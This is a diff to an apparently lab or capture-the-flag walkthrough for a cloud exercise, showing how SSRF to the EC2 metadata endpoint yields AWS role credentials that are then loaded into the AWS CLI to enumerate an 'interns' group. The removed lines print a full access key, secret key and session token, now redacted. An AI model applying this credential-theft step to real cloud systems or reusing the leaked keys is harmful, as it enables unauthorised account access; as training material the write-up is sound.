@@ -54,13 +54,13 @@ Brute-list:  /home/kali/cloud_enum/enum_tools/fuzz.txt
 ## 4. Name of the user who is part of the “interns” group.
 
 - SSRF to this endpoint to get the credentials for accessing AWS using AWS CLI: http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
-![alt text](image.png)
+![alt text](4.png)
 - Configure access and find the users of `interns` group:
 ```pwsh
 PS C:\Users\hanoi> aws configure --profile mcrta
-AWS Access Key ID [None]: ASIATQGVY3V5XM3IQ6OR
-AWS Secret Access Key [None]: AfL9c6D6/PilkI6a0BDA1/zx9luIYvgafm9lFagL
-AWS Session Token [None]: IQoJb3JpZ2luX2VjEMb//////////wEaCXVzLWVhc3QtMiJHMEUCIE5F2N+tXsAbR9DSPLyPtRXZvRrO65+K6MlrWVezlmLrAiEAlMQ8YYKLtmrPCZ68oyOKbwtluhmDqug35/vOebsxWRoqwwUIkP//////////ARAAGgwyNDA5NjY0OTE1MTUiDMtYY26AjEORW/n0QyqXBcqPPzSKFjd/CUY5wP4lhhSjIc9HyJWDX8BV1RApI44dSvPLC+EEnTcrJx+GkwAgFtqlOHr0pG6jnvlrnYrIaq95u0Dd2m15Bp+W+33okG+PUEbqL5U/X4Z91h2OkCcnvRvtBsgxGB3XoszzrHTnXCCikIvFuqmCj4XJrDLsCTBt2e3jnjqGFG5Lvsrn+x+OwT+GyxcRMkjbOtsT3D4SIbllthxdW37Bl69R+xarrvY8xSiBttqNfLSMfB6QyrTEMhphpNurFfWI1+agD3bwjx2E2C38/jG3VL/wpDeqzD+hkDKVnQzJ3m7FkubP/rQN/dPb2o9wCyvT8T8iP5kPYvdvaxtBp1F2lxAIPzMz1nkYOcetRy21f+esj0Vbk2MOjwgowtsGG2C/bV8eSxQ5EErVQt778CritYrYS7oFXSxMv3JN9xk5KhQPRspc/29tl27oubRpKk+X5VNEYhjZcglxMWp3u0Pvl2l/tR2eQIuOwa7nDzzm+98C0PGwAjMT74Wr4aT9HvUU2QAPZuNZj4Lx9fCWf4JJCIEPtjuaCiYIHwkvOaa7LDO6jImMskyYYpHhSlC49/lQ4HsBrsDYuzZ/uCCPBtM9BYzc2bvrufEFZkuD3TLhH68KeisPQrC+t/O1znENtCVxfBk+0o5061WltgsWb0FdxKqfC5Exm00pYee5rlBNkPLqoUlQ8g+HMV+Z+0ygqV/6wB8hmMBw/Up6fOf0yxI+O7JqG/ZoElWTGXbVCrVwhHwgVGpGQMaEXzptkyRid8py/qX9Bc9E5J+wv8wnjaijrd4ON/bDz2eaUXwFY7XgfGWetzGeZPVWknfRzG/Iz6GT+wef0k7y1NXnywjdNXMNHw7yGnjS3A2on8PLrqXtqjC+n/nOBjqxAbuTx0P1dAfZn0EQr9owXRoWCM5Yp+EDiLbOGeTiocBx/LY7t9K17UCWLtYqzO7/myWEeCdgZxj1faaNxUahf3QNRW4lUio3g4IKEIMvkXMrV14Vi8LHUhczwe0pozIT7L9tEtm/U5VjDKEk0QEBMc7gD65ZHmKQ3f7YY14Kcy3KPzUZzkCMQ1cCL/PkTpu/xMZozOTg2M3phc8TOQTgEmsZnY9MEHnOwq8LArxHyCPDXw==
+AWS Access Key ID [None]: xxx
+AWS Secret Access Key [None]: xxx
+AWS Session Token [None]: xxx
 Default region name [None]:
 Default output format [None]:
 PS C:\Users\hanoi> aws sts get-caller-identity --profile mcrta
